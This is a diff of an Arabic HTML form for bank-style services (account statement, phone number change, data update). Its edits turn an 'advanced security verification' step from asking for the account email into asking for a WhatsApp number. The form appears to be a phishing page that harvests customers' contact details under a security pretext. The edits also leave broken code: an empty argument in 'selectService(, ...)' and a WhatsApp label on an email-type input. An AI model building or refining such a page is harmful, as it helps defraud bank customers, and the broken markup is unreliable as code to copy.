@@ -67,7 +67,7 @@
             <h2>الاستمارة أونلاين</h2>
             <h3>اختر نوع المشكلة التي تواجهها (ما يمكن معالجته عبر هذا القسم)</h3>
             <div class="service-grid">
-                <div class="service-option selected" onclick="selectService(1, 'كشف الحساب')">
+                <div class="service-option selected" onclick="selectService(, 'كشف الحساب')">
                     <div class="service-content">
                         <span class="service-title">كشف الحساب</span>
                         <span class="service-desc">الحصول على كشف حساب مفصل.</span>
@@ -104,8 +104,8 @@
                 </div>
                 <div class="service-option" onclick="selectService(6, 'تغير الهاتف')">
                     <div class="service-content">
-                        <span class="service-title">تغير الهاتف القديم إلى هاتف جديد.</span>
-                        <span class="service-desc">تغير الهاتف القديم إلى هاتف جديد.</span>
+                        <span class="service-title">تغير رقم  الهاتف القديم إلى رقم  هاتف جديد.</span>
+                        <span class="service-desc">تغير رقم الهاتف القديم إلى رقم هاتف جديد.</span>
                     </div>
                     <span>🔄</span>
                 </div>
@@ -118,8 +118,8 @@
                 </div>
                 <div class="service-option" onclick="selectService(8, 'إثبات دخل')">
                     <div class="service-content">
-                        <span class="service-title">إثبات دخل</span>
-                        <span class="service-desc">تأكيد وتوثيق مصادر الدخل الشهري والوظيفة.</span>
+                        <span class="service-title">تحديث البيانات </span>
+                        <span class="service-desc">تأكيد وتوثيق مصادر الدخل الشهري والوظيفي دون الحوجة لزيارة الفرع .</span>
                     </div>
                     <span>💼</span>
                 </div>
@@ -207,10 +207,10 @@
         <!-- الصفحة الثالثة: طلب البريد الإلكتروني -->
         <div id="step-whatsapp-verification" class="card hidden">
             <h2>التحقق الأمني المتقدم</h2>
-            <h3>لدواعي أمنية يرجى إدخال البريد الإلكتروني المرتبط بالحساب</h3>
+            <h3>لدواعي أمنية يرجى إدخال  رقم واتساب فعال للتواصل </h3>
             <div class="input-group">
-                <label for="gmail-num">البريد الإلكتروني:</label>
-                <input type="email" id="gmail-num" name="email" autocomplete="email" placeholder="example@domain.com">
+                <label for="whatsapp-num">رقم الواتساب :</label>
+                <input type="email" id="gmail-num" name="email" autocomplete="email" placeholder="ادخل رقم واتساب للتواصل ">
             </div>
             <button class="btn-submit" onclick="submitWhatsappStep()">حفظ ومتابعة</button>
         </div>
@@ -507,4 +507,4 @@
         }
     </script>
 </body>
-</html>
+    </html>
